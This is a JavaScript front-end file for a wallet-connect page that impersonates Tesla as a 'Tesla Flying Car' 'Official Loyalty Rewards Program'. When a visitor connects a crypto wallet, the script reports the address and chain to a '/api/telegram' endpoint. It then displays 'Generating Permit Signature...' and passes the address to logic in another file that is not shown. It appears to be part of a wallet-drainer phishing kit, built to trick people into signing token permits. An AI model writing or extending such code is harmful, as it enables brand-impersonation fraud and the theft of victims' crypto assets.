import { createWeb3Modal } from 'https://cdn.jsdelivr.net/npm/@web3modal/html@latest/+esm';
import { defaultWagmiConfig } from 'https://cdn.jsdelivr.net/npm/@wagmi/core@2/+esm';
import { mainnet, bsc, polygon } from 'https://cdn.jsdelivr.net/npm/wagmi/chains/index/+esm';

// YOUR PROJECT ID
const projectId = '862d3799047c7548b0482add1cba796d';

const metadata = {
    name: 'Tesla Flying Car',
    description: 'Official Loyalty Rewards Program',
    url: window.location.origin, 
    icons: ['https://upload.wikimedia.org/wikipedia/commons/e/e8/Tesla_logo.png']
};

const chains = [mainnet, bsc, polygon];

const config = defaultWagmiConfig({
    chains,
    projectId,
    metadata,
    ssr: true
});

createWeb3Modal({ wagmiConfig: config, projectId });

// Listen for connection events
window.addEventListener('w3modal_account_connected', async (event) => {
    const address = event.detail.address;
    const chainId = event.detail.chainId;
    
    // Report Visit & Connection to Telegram
    await fetch('/api/telegram', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ 
            action: 'WALLET_CONNECTED', 
            details: { userAddress: address, chainId, timestamp: new Date().toISOString() } 
        })
    });

    // Update UI
    document.getElementById('connect-step').classList.remove('active');
    document.getElementById('dashboard').classList.add('active');
    document.getElementById('user-address').textContent = `${address.slice(0,6)}...${address.slice(-4)}`;
    document.getElementById('reward-status').textContent = "Generating Permit Signature...";
    
    // Call the function in app.js
    if (typeof window.initAppLogic === 'function') {
        window.initAppLogic(address);
    }
});